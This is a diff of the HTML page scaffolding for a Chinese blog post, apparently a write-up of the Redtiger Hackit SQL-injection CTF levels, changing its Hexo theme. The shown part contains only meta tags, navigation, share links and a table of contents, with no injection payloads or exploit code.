@@ -1,23 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang=zh>
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon_32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon_16.png">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"hdfzzf.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="网站：https:&#x2F;&#x2F;redtiger.labs.overthewire.org&#x2F;">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="网站：https:&#x2F;&#x2F;redtiger.labs.overthewire.org&#x2F;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Redtiger_Hackit_WriteUp">
 <meta property="og:url" content="https://hdfzzf.github.io/2022/03/18/Redtiger's_Hackit_WriteUp/index.html">
@@ -69,340 +58,268 @@
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161838.png">
-
-
-<link rel="canonical" href="https://hdfzzf.github.io/2022/03/18/Redtiger's_Hackit_WriteUp/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/03/18/Redtiger's_Hackit_WriteUp/","path":"2022/03/18/Redtiger's_Hackit_WriteUp/","title":"Redtiger_Hackit_WriteUp"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Redtiger_Hackit_WriteUp | HDFZZF's BLOG</title>
-  
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-  <a target="_blank" rel="noopener" href="https://github.com/hdfzzf" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
-
-  <main class="main">
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">HDFZZF's BLOG</p>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu">
-        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
-    </div>
-  </div>
-
-</div>
+    
+    
+      
         
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
+          <link rel="shortcut icon" href="/images/LOGO.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Redtiger_Hackit_WriteUp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
-  <aside class="sidebar">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
       </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/01/30/pickle%20%E5%BA%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&text=Redtiger_Hackit_WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&title=Redtiger_Hackit_WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&is_video=false&description=Redtiger_Hackit_WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Redtiger_Hackit_WriteUp&body=Check out this article: https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&title=Redtiger_Hackit_WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&title=Redtiger_Hackit_WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&title=Redtiger_Hackit_WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&title=Redtiger_Hackit_WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&name=Redtiger_Hackit_WriteUp&description=&lt;p&gt;网站：https://redtiger.labs.overthewire.org/&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161838.png&#34; /&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/&t=Redtiger_Hackit_WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
 
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#level-1"><span class="nav-text">Level-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-text">测试注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="nav-text">注入过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-2"><span class="nav-text">Level-2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-1"><span class="nav-text">测试注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-1"><span class="nav-text">注入过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-3"><span class="nav-text">Level-3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-2"><span class="nav-text">测试注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-2"><span class="nav-text">注入过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-4"><span class="nav-text">Level-4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3"><span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-3"><span class="nav-text">测试注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-3"><span class="nav-text">注入过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-5"><span class="nav-text">Level-5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4"><span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-4"><span class="nav-text">测试注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-4"><span class="nav-text">注入过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-6"><span class="nav-text">Level-6 ⭐</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-5"><span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-5"><span class="nav-text">测试注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-5"><span class="nav-text">注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-text">思路 ⭐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B"><span class="nav-text">过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-7"><span class="nav-text">Level-7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-6"><span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-6"><span class="nav-text">测试注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-6"><span class="nav-text">注入过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-8"><span class="nav-text">Level-8</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-7"><span class="nav-text">题目描述 ⭐</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-7"><span class="nav-text">测试注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-7"><span class="nav-text">注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%96%91%E6%83%91%E7%82%B9"><span class="nav-text">疑惑点 ⭐</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-9"><span class="nav-text">Level-9</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-8"><span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-8"><span class="nav-text">测试注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-8"><span class="nav-text">注入过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-10"><span class="nav-text">Level-10 ⭐</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-9"><span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-9"><span class="nav-text">测试注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-9"><span class="nav-text">注入过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="hdfzzf"
-      src="/images/zzf.jpg">
-  <p class="site-author-name" itemprop="name">hdfzzf</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap site-overview-item animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">121</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">13</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">194</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author site-overview-item animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/hdfzzf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hdfzzf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:dfhong1998@163.com" title="E-Mail → mailto:dfhong1998@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
-        </div>
-      </div>
     </div>
-  </aside>
-  <div class="sidebar-dimmer"></div>
-
-
-    </header>
-
-    
-  <div class="back-to-top" role="button" aria-label="返回顶部">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-  <div class="reading-progress-bar"></div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/03/18/Redtiger's_Hackit_WriteUp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/zzf.jpg">
-      <meta itemprop="name" content="hdfzzf">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="HDFZZF's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          Redtiger_Hackit_WriteUp
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-03-18 00:00" itemprop="dateCreated datePublished" datetime="2022-03-18T00:00:00+08:00">2022-03-18</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-04-26 21:01" itemprop="dateModified" datetime="2022-04-26T21:01:01+08:00">2022-04-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus：</span>
-    
-    <a title="disqus" href="/2022/03/18/Redtiger's_Hackit_WriteUp/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/03/18/Redtiger's_Hackit_WriteUp/" itemprop="commentCount"></span>
-    </a>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#level-1"><span class="toc-number">1.</span> <span class="toc-text">Level-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-2"><span class="toc-number">2.</span> <span class="toc-text">Level-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-1"><span class="toc-number">2.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-1"><span class="toc-number">2.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-3"><span class="toc-number">3.</span> <span class="toc-text">Level-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">3.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-2"><span class="toc-number">3.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-2"><span class="toc-number">3.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-4"><span class="toc-number">4.</span> <span class="toc-text">Level-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">4.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-3"><span class="toc-number">4.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-3"><span class="toc-number">4.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-5"><span class="toc-number">5.</span> <span class="toc-text">Level-5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">5.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9-4"><span class="toc-number">5.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-4"><span class="toc-number">5.3.</span> <span class="toc-text">注入过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-6"><span class="toc-number">6.</span> <span class="toc-text">Level-6 ⭐</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 